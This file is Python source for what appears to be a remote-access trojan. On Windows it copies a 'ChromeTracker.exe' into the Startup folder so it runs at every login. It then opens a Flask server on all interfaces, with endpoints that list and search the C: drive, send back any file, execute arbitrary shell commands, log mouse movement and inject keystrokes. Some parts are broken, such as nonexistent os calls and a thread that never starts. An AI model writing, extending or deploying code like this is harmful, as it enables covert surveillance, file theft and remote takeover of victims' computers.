mouseThread=None
keyboardthread=None
desktopthread=None
keyboardlog=[]
mouselog=[]
try:
    import os, platform,threading
    if platform.system() == "Windows":
        os.system("pythonw -m pip install requests flask")
        try:
            if not os.exists("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/ChromeTracker.exe"):
                if os.exists('V:/ChromeTracker.exe'):
                    with open("V:/ChromeTracker.exe","rb") as f1:
                        with open("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup/ChromeTracker.exe","wb") as f2:
                            f2.write(f1.read())
                            f2.close()
                        f1.close()
        except:
            print()
    import flask
    from flask import Flask 
    trackingmouse=threading.Event()
    trackingkeyboard = threading.Event()
    trackingdesktop = threading.Event()
    api = Flask("")
    @api.route("/check",methods=['POST'])
    def check():
        return "READY"
    @api.route("/list",methods=['POST'])
    def ls():
        returnls = []
        request=flask.request
        if request.args.get('dir'):
            for root, dirs, files in os.walk(request.args.get('dir')):
                for name in files:
                   returnls.append(os.path.join(root, name))
        elif request.args.get('dir') == None:
            for root, dirs, files in os.walk(request.args.get('C:/')):
                for name in files:
                   returnls.append(os.path.join(root, name))
        return str(returnls)
    @api.route('/find',methods=['POST'])
    def find():
        request = flask.request
        if not request.args.get('filename'):
            return "NEED FILENAME TO MATCH FOR"
        else:
            filename = request.args.get('filename')
            returnls = []
            for root, dirs, files in os.walk("C:/"):
                for name in files:
                   if filename in name:
                       returnls.append(os.path.join(root, name))
            return str(returnls)
    @api.route("/get",methods=['POST'])
    def getfile():
        if flask.request.args.get('file'):
            filename = flask.request.args.get('file')
        return flask.send_file(filename)
    @api.route("/command",methods=['POST'])
    def command():
        import subprocess
        argv = flask.request.args.get("cmd").split(" ")[1:]
        result = subprocess.run(argv, stdout=subprocess.PIPE)
        return result.stdout.decode('utf-8')
    @api.route("/tracking/mouse",methods=['POST'])
    def mousemacro():
        request = flask.request
        if request.args.get('start') and not trackingmouse.is_set():
            mousethread=threading.Thread(target=trackingmouseaction)
            trackingmouse.set()
            return "STARTED"
        elif request.args.get('stop') and trackingmouse.is_set():
            trackingmouse.clear()
            return mousethread.join()
        elif request.args.get('start') and trackingmouse.is_set():
            return "ALREADY STARTED"
        elif request.args.get('stop') and not trackingmouse.is_set():
            return "NOT STARTED"
    @api.route("/malware/keyboard/press")
    def keyboardtyper():
        import pyautogui
        request = flask.request
        if request.args.get('out'):
            if trackingkeyboard.is_set():
                keyboardlog.append("----INJECTED INPUT----")
        if request.args.get('out')[0]+request.args.get('out')[1]+request.args.get('out')[2] == 'XPT':
            for command in request.args.get('out').split('XPT'):
                pyautogui.press(command)
        else:
            for char in request.args.get('out'):
                pyautogui.write(char)
        if trackingkeyboard.is_set():
                keyboardlog.append("-----END INJECTED-----")
    api.run("0.0.0.0","42069")
except Exception as e:
    print(e)
def trackingmouseaction():
    try:
        import pyautogui
    except ImportError:
        import os
        os.system('python3 -m pip install pyautogui')
    previousmouseloc=pyautogui.position()
    global mouselog
    log=mouselog
    while trackingmouse.is_set():
        currentmouseloc = pyautogui.position()
        if not previousmouseloc == currentmouseloc:
            log.append(currentmouseloc)
    mouselog=[]
    return log